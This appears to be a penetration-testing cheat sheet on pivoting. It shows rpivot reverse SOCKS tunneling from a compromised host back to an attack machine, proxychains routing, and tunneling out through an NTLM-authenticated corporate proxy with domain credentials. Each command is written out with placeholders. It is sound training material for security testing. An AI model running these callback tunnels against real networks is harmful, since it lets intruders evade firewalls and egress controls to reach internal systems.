## METHODOLOGY

1. **Inbound traffic blocked** by firewall but outbound is permitted: use reverse SOCKS tunneling to establish a callback from the pivot host to the attack machine,.
2. **Standard egress blocked** by corporate proxy requiring NTLM: use the authenticated proxy tunnel variant.
3. **Network reachability confirmed**: route local tools through the established tunnel using `proxychains`.

---

## Reverse SOCKS Tunneling with Rpivot

Inbound connections to the target network are restricted, but the compromised host can reach the attack machine over the network.

Start the server listener on the attack host to wait for the client callback:

```
python2.7 server.py --proxy-port <PORT> --server-port <PORT> --server-ip 0.0.0.0
```

Execute the client on the pivot target to connect back to the attack host:

```
python2.7 client.py --server-ip <ATTACK_IP> --server-port <PORT>
```

Route application traffic through the established SOCKS tunnel:

```
proxychains firefox-esr <TARGET_IP>:<PORT>
```

**Dangerous / misconfigured settings**

- Running the server on `0.0.0.0` exposes the server port and proxy port to all interfaces.

**Gotchas**

- **Missing Python 2.7 runtime** on the pivot target or attack host will prevent script execution.
- **Proxychains port mismatch** occurs if the local config file does not match the port specified by `--proxy-port`.

> ⚠️ Gap: The source implies `proxychains` is pre-configured to match the `rpivot` proxy port, but does not provide the configuration steps for `/etc/proxychains.conf` which is required for the tool to successfully route traffic.

## NTLM Proxy Egress

Outbound traffic from the internal network is forced through an NTLM-authenticated HTTP proxy.

Establish the tunnel by authenticating through the corporate proxy:

```
python client.py --server-ip <TARGET_IP> --server-port <PORT> --ntlm-proxy-ip <PIVOT_IP> --ntlm-proxy-port <PORT> --domain <DOMAIN> --username <USERNAME> --password <PASSWORD>
```

**Gotchas**

- **Incorrect domain credentials** will result in the NTLM proxy rejecting the connection,.